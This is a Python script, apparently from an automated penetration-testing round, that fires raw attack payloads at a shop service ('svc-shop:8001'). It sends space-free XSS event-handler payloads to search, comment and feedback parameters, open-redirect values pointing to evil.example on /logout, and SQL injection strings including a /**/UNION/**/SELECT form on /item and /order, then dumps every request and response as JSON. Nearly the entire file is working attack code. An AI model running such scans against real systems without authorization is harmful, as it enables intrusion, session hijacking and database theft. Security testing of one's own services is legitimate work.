#!/usr/bin/env python3
# INT-r27-0011/0012/0013 联合补轮（round 3）
# A) XSS 事件形无空格载荷原形发送（/ 斜杠分隔属性 + 无空格引号闭合形）
# B) /logout 重定向参数原形值（http://evil.example 不编码 : / —— query 合法字符）
# C) /item /order SQLi 无空格载荷原形（1' / 1'AND'1'='1 / 1'AND'1'='2 / /**/UNION/**/）
import http.client, json, time

HOST, PORT = "svc-shop", 8001

def send(path_query):
    c = http.client.HTTPConnection(HOST, PORT, timeout=8)
    c.request("GET", path_query, headers={"Host": "svc-shop:8001", "Connection": "close"})
    r = c.getresponse()
    body = r.read().decode("utf-8", "replace")
    hdrs = dict(r.getheaders())
    c.close()
    return r.status, hdrs, body

results = []

# A) XSS 无空格事件/引号形（原形字符均 URL 合法：字母数字 < > / = " -）
XSS_CASES = []
for p, prms in [("/search", ["q", "text"]), ("/comment", ["q", "msg"]), ("/reply", ["text", "q"]), ("/feedback", ["msg", "q"])]:
    for prm in prms:
        for tag, pl in [("x2e-img-slash", "<img/src=x/onerror=probe7x9>"),
                        ("x2f-svg", "<svg/onload=probe7x9>"),
                        ("x3q-quote-tight", '"onmouseover=probe7x9"')]:
            XSS_CASES.append((p, prm, tag, pl))
for p, prm, tag, pl in XSS_CASES:
    tgt = p + "?" + prm + "=" + pl
    time.sleep(0.25)
    try:
        s, h, b = send(tgt)
        results.append({"track": "xss", "path": p, "param": prm, "payload_tag": tag, "payload": pl,
                        "raw_request": "GET %s HTTP/1.1\r\nHost: svc-shop:8001\r\n\r\n" % tgt,
                        "status": s, "headers": h, "body": b})
    except Exception as e:
        results.append({"track": "xss", "path": p, "param": prm, "payload_tag": tag, "payload": pl, "error": repr(e)})

# B) 重定向原形值
RD_VALUES = [("abs-http-raw", "http://evil.example"), ("proto-rel-raw", "//evil.example"),
             ("abs-https-raw", "https://evil.example/r?x=1")]
for prm in ["next", "to", "url", "goto", "redirect", "continue"]:
    for tag, val in RD_VALUES:
        tgt = "/logout?" + prm + "=" + val
        time.sleep(0.25)
        try:
            s, h, b = send(tgt)
            results.append({"track": "redirect", "path": "/logout", "param": prm, "payload_tag": tag, "payload": val,
                            "raw_request": "GET %s HTTP/1.1\r\nHost: svc-shop:8001\r\n\r\n" % tgt,
                            "status": s, "headers": h, "body": b})
        except Exception as e:
            results.append({"track": "redirect", "path": "/logout", "param": prm, "payload_tag": tag, "payload": val, "error": repr(e)})

# C) SQLi 无空格原形载荷
SQL_PAYLOADS = [("s1-quote-raw", "1'"), ("s2-true-tight", "1'AND'1'='1"), ("s3-false-tight", "1'AND'1'='2"),
                ("s4-union-comment", "1'/**/UNION/**/SELECT/**/1--")]
for p in ["/item", "/order"]:
    for prm in ["id", "q", "item_id"]:
        for tag, pl in SQL_PAYLOADS:
            tgt = p + "?" + prm + "=" + pl
            time.sleep(0.25)
            try:
                s, h, b = send(tgt)
                results.append({"track": "sqli", "path": p, "param": prm, "payload_tag": tag, "payload": pl,
                                "raw_request": "GET %s HTTP/1.1\r\nHost: svc-shop:8001\r\n\r\n" % tgt,
                                "status": s, "headers": h, "body": b})
            except Exception as e:
                results.append({"track": "sqli", "path": p, "param": prm, "payload_tag": tag, "payload": pl, "error": repr(e)})

print(json.dumps({"intent": "INT-r27-0011/0012/0013", "round": 3, "target": "http://svc-shop:8001",
                  "count": len(results), "results": results}, ensure_ascii=False))
